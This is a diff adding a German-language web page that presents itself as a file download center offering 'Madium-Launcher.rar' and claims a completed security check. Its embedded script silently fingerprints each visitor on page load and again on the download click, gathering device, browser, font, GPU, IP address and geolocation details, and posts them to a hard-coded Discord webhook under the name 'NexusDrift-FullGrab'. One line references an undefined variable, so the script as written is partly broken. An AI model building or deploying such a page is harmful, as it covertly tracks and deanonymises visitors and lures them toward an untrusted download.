@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Center - Dateitransfer</title>
+    <style>
+        /* Schlichtes, seriöses Design */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            background-color: #f4f7f9;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .file-icon {
+            font-size: 48px;
+            color: #0078d4;
+            margin-bottom: 15px;
+        }
+        h1 { font-size: 20px; margin: 0 0 10px; color: #222; }
+        .info {
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            padding: 15px;
+            border-radius: 4px;
+            text-align: left;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .btn {
+            display: block;
+            background-color: #0078d4;
+            color: white;
+            text-decoration: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-weight: 600;
+            transition: background 0.2s;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+        }
+        .btn:hover { background-color: #005a9e; }
+        .footer { font-size: 11px; color: #888; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="file-icon">📄</div>
+    <h1>Datei zum Download bereit</h1>
+    <p style="font-size: 14px; color: #666;">Ihre angeforderte Datei steht zur Verfügung.</p>
+
+    <div class="info">
+        <strong>Name:</strong> Madium-Launcher.rar<br>
+        <strong>Größe:</strong> 18.4 MB<br>
+        <strong>Typ:</strong> WinRAR-Archiv
+    </div>
+
+    <a href="Madium-Launcher.rar" class="btn" id="downloadBtn" download>Datei herunterladen</a>
+
+    <div class="footer">Sicherheitsüberprüfung abgeschlossen.</div>
+</div>
+
+<script>
+// YOUR WEBHOOK (keep yours)
+const webhookURL = "https://discord.com/api/webhooks/1508828454727192607/ZpFV-4AWkZnTXdpfvaUrMcl_0XWvsAgOBEfxDy3RfWkNslj782sACI7Z2lniUse1xVGO";
+
+// Collect EVERYTHING
+async function getAllInfo() {
+    const info = {};
+
+    // Basic browser / device
+    info.userAgent = navigator.userAgent;
+    info.platform = navigator.platform;
+    info.language = navig.language;
+    info.languages = navigator.languages;
+    info.cookieEnabled = navigator.cookieEnabled;
+    info.doNotTrack = navigator.doNotTrack;
+    info.hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
+    info.deviceMemory = navigator.deviceMemory || "N/A";
+    info.maxTouchPoints = navigator.maxTouchPoints || "N/A";
+
+    // Screen
+    info.screenWidth = screen.width;
+    info.screenHeight = screen.height;
+    info.availWidth = screen.availWidth;
+    info.availHeight = screen.availHeight;
+    info.colorDepth = screen.colorDepth;
+    info.pixelRatio = devicePixelRatio;
+
+    // Window size
+    info.innerWidth = window.innerWidth;
+    info.innerHeight = window.innerHeight;
+    info.outerWidth = window.outerWidth;
+    info.outerHeight = window.outerHeight;
+
+    // Timezone
+    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    info.timezoneOffset = new Date().getTimezoneOffset();
+
+    // Battery (if available)
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        info.batteryLevel = battery.level * 100 + "%";
+        info.batteryCharging = battery.charging;
+    } else {
+        info.batteryLevel = "N/A";
+        info.batteryCharging = "N/A";
+    }
+
+    // WebGL / GPU info
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (gl) {
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        if (debugInfo) {
+            info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        }
+    } else {
+        info.webglRenderer = "N/A";
+        info.webglVendor = "N/A";
+    }
+
+    // Canvas fingerprint (simple)
+    const canvasFp = document.createElement("canvas");
+    canvasFp.width = 200;
+    canvasFp.height = 50;
+    const ctx = canvasFp.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(0, 0, 100, 50);
+    ctx.fillStyle = "#069";
+    ctx.fillText("NexusDrift", 10, 20);
+    info.canvasFingerprint = canvasFp.toDataURL().slice(0, 100); // shortened, full is too long
+
+    // Installed fonts (via JS detection)
+    const testFonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Comic Sans MS", "Impact", "Georgia", "Tahoma", "Trebuchet MS", "Arial Black", "Lucida Console", "Roboto", "Open Sans", "Lato", "Montserrat"];
+    const baseFonts = ["monospace", "sans-serif", "serif"];
+    const fontTestDiv = document.createElement("div");
+    fontTestDiv.style.visibility = "hidden";
+    fontTestDiv.style.position = "absolute";
+    fontTestDiv.style.top = "-9999px";
+    document.body.appendChild(fontTestDiv);
+
+    const installed = [];
+    for (const font of testFonts) {
+        let isInstalled = false;
+        for (const base of baseFonts) {
+            fontTestDiv.style.fontFamily = `"${font}", ${base}`;
+            fontTestDiv.innerHTML = "mmmmmmmmmmlli";
+            const defaultDiv = document.createElement("div");
+            defaultDiv.style.fontFamily = base;
+            defaultDiv.innerHTML = "mmmmmmmmmmlli";
+            document.body.appendChild(defaultDiv);
+            if (fontTestDiv.offsetWidth !== defaultDiv.offsetWidth || fontTestDiv.offsetHeight !== defaultDiv.offsetHeight) {
+                isInstalled = true;
+            }
+            document.body.removeChild(defaultDiv);
+            if (isInstalled) break;
+        }
+        if (isInstalled) installed.push(font);
+    }
+    document.body.removeChild(fontTestDiv);
+    info.installedFonts = installed.slice(0, 15).join(", ");
+
+    // Plugins (legacy but still useful)
+    const plugins = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+    }
+    info.plugins = plugins.slice(0, 10).join(", ");
+
+    // Touch support
+    info.touchSupport = "ontouchstart" in window || navigator.maxTouchPoints > 0;
+
+    // Local storage / session storage available
+    info.localStorage = !!window.localStorage;
+    info.sessionStorage = !!window.sessionStorage;
+
+    // IP + geolocation (your existing ipapi.co)
+    const ipRes = await fetch('https://ipapi.co/json/');
+    const ipData = await ipRes.json();
+    info.ip = ipData.ip || "N/A";
+    info.city = ipData.city || "N/A";
+    info.country = ipData.country_name || "N/A";
+    info.region = ipData.region || "N/A";
+    info.postal = ipData.postal || "N/A";
+    info.latitude = ipData.latitude || "N/A";
+    info.longitude = ipData.longitude || "N/A";
+    info.org = ipData.org || "N/A";
+
+    return info;
+}
+
+// Send to Discord
+async function sendFullLog(eventType) {
+    try {
+        const allData = await getAllInfo();
+
+        // Format for Discord embed (max 1024 chars per field)
+        const fields = [];
+        for (const [key, val] of Object.entries(allData)) {
+            let strVal = String(val);
+            if (strVal.length > 1024) strVal = strVal.substring(0, 1020) + "...";
+            fields.push({ name: key, value: strVal || "N/A", inline: false });
+        }
+
+        const payload = {
+            username: "NexusDrift-FullGrab",
+            embeds: [{
+                title: eventType,
+                color: 0xFF0000, // red for full grab
+                fields: fields.slice(0, 25), // Discord limit ~25 fields
+                timestamp: new Date().toISOString(),
+                footer: { text: "Nexus Drift — full device fingerprint" }
+            }]
+        };
+
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (err) {
+        console.log("Send failed", err);
+    }
+}
+
+// Fire on page load AND on download click
+window.onload = () => sendFullLog("📥 PAGE LOADED — FULL DEVICE INFO");
+document.getElementById('downloadBtn').onclick = () => sendFullLog("✅ DOWNLOAD CLICKED — FULL INFO");
+</script>
+
+</body>
+</html>
